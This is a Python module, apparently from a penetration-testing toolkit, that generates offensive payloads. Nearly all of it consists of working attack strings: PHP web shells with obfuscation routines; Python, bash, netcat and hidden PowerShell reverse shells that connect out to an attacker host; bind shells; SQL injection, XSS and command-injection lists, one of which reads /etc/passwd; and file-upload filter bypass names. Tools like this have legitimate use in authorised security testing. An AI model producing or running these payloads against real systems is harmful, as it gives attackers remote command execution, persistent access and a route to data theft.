"""
Cerberus Payload Service

Microservice for generating various attack payloads.
Supports multiple payload types: Web shells, Reverse shells, SQL injection, XSS, etc.
"""

import random
import string
import base64
from typing import List, Dict, Optional


class PayloadService:
    """
    Service for generating offensive security payloads.
    Handles various payload types and encoding options.
    """
    
    # PHP Webshell templates
    PHP_WEBSHELLS = [
        # Basic cmd execution
        '<?php system($_GET["cmd"]); ?>',
        '<?php shell_exec($_GET["cmd"]); ?>',
        '<?php passthru($_GET["cmd"]); ?>',
        '<?php exec($_GET["cmd"]); ?>',
        # Obfuscated variants
        '<?php $c=$_GET["c"];system($c);?>',
        '<?php @eval($_POST["cmd"]); ?>',
        '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
        '<?php echo "<pre>";system($_GET["cmd"]);echo "</pre>"; ?>',
    ]
    
    # Python Reverse shells
    PYTHON_REVERSE_SHELLS = [
        # Standard Python reverse shell
        'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        # Python one-liner
        'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        # Python with pty
        'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/sh")\'',
    ]
    
    # Bash Reverse shells
    BASH_REVERSE_SHELLS = [
        'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'',
        '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; /bin/sh <&196 >&196 2>&196',
        'rm -f /tmp/p; mknod /tmp/p p && /bin/sh 0</tmp/p | nc {lhost} {lport} 1>/tmp/p',
    ]
    
    # Netcat reverse shells
    NETCAT_REVERSE_SHELLS = [
        'nc -e /bin/sh {lhost} {lport}',
        'nc -e /bin/bash {lhost} {lport}',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    ]
    
    # PowerShell reverse shells
    POWERSHELL_REVERSE_SHELLS = [
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($n=$s.Read($b,0,$b.Length))-gt0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$n);$p=iex $d 2>&1;$b=([text.encoding]::ASCII.GetBytes($p))}};$s.Close()"',
    ]
    
    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "admin'--",
        "admin' #",
        "1' OR '1'='1' --",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
    ]
    
    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "`ls -la`",
        "$(ls -la)",
        "\nls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
    ]
    
    def __init__(self):
        """Initialize the payload service."""
        pass
    
    def generate_php_webshell(self, variant: int = 0) -> str:
        """Generate PHP webshell."""
        if variant < len(self.PHP_WEBSHELLS):
            return self.PHP_WEBSHELLS[variant]
        return random.choice(self.PHP_WEBSHELLS)
    
    def generate_reverse_shell(self, 
                                shell_type: str = "python",
                                lhost: str = "10.10.10.10", 
                                lport: int = 4444) -> str:
        """Generate reverse shell payload."""
        templates = {
            "python": self.PYTHON_REVERSE_SHELLS,
            "bash": self.BASH_REVERSE_SHELLS,
            "netcat": self.NETCAT_REVERSE_SHELLS,
            "powershell": self.POWERSHELL_REVERSE_SHELLS,
        }
        
        shells = templates.get(shell_type.lower(), self.PYTHON_REVERSE_SHELLS)
        payload = random.choice(shells)
        
        return payload.format(lhost=lhost, lport=lport)
    
    def generate_bind_shell(self, 
                            shell_type: str = "python",
                            port: int = 4444) -> str:
        """Generate bind shell payload."""
        if shell_type.lower() == "python":
            return f'python3 -c \'import socket,subprocess;s=socket.socket();s.bind(("",{port}));s.listen(1);c,a=s.accept();[c.send(b"SHELL\\n") or subprocess.call(["/bin/sh","-i"],stdin=c,stdout=c,stderr=c)]\''
        elif shell_type.lower() == "netcat":
            return f'nc -lvp {port} -e /bin/sh'
        return "Bind shell not implemented for this type"
    
    def get_sql_injection_payloads(self) -> List[str]:
        """Get SQL injection payloads."""
        return self.SQL_INJECTION_PAYLOADS.copy()
    
    def get_xss_payloads(self) -> List[str]:
        """Get XSS payloads."""
        return self.XSS_PAYLOADS.copy()
    
    def get_command_injection_payloads(self) -> List[str]:
        """Get command injection payloads."""
        return self.COMMAND_INJECTION_PAYLOADS.copy()
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """Encode a payload."""
        if encoding.lower() == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding.lower() == "url":
            from urllib.parse import quote
            return quote(payload)
        elif encoding.lower() == "hex":
            return payload.encode().hex()
        elif encoding.lower() == "html":
            return payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        return payload
    
    def generate_obfuscated_php(self, base_shell: str = None) -> str:
        """Generate obfuscated PHP webshell."""
        if base_shell is None:
            base_shell = self.generate_php_webshell()
        
        # Simple obfuscation techniques
        obfuscations = [
            # Variable reassignment
            base_shell.replace("$_GET", '$' + ''.join(random.choices(string.ascii_lowercase, k=3))),
            # String reversal
            base_shell[::-1],
            # Char code encoding
            ''.join([f'chr({ord(c)})' if c.isalpha() else c for c in base_shell]),
            # Random case variation
            ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base_shell),
        ]
        
        return random.choice(obfuscations)
    
    def generate_file_upload_bypass(self, extension: str = "php") -> List[str]:
        """Generate file upload bypass techniques."""
        bypasses = [
            f"shell.{extension}",
            f"shell.{extension.upper()}",
            f"shell.{extension}5",
            f"shell.{extension}s",
            f"shell.{extension}p",
            f"shell.php.jpg",
            f"shell.php.png",
            f"shell.php.",
            f"shell.php%00.jpg",
            f"shell.php\x00.jpg",
            f"shell.pHP{extension}",
            f"shell.PhP{extension}",
        ]
        return bypasses
    
    def get_all_payload_types(self) -> Dict[str, str]:
        """Get all available payload types."""
        return {
            "1": "PHP Webshell",
            "2": "Python Reverse Shell",
            "3": "Bash Reverse Shell",
            "4": "Netcat Reverse Shell",
            "5": "PowerShell Reverse Shell",
            "6": "SQL Injection",
            "7": "XSS",
            "8": "Command Injection",
            "9": "File Upload Bypass",
        }


# ==================== Module-level functions ====================

_service = PayloadService()

def generate_php_webshell(variant: int = 0) -> str:
    """Generate PHP webshell."""
    return _service.generate_php_webshell(variant)

def generate_reverse_shell(shell_type: str = "python", lhost: str = "10.10.10.10", lport: int = 4444) -> str:
    """Generate reverse shell."""
    return _service.generate_reverse_shell(shell_type, lhost, lport)

def get_sql_injection_payloads() -> List[str]:
    """Get SQL injection payloads."""
    return _service.get_sql_injection_payloads()

def get_xss_payloads() -> List[str]:
    """Get XSS payloads."""
    return _service.get_xss_payloads()

def encode_payload(payload: str, encoding: str = "base64") -> str:
    """Encode a payload."""
    return _service.encode_payload(payload, encoding)
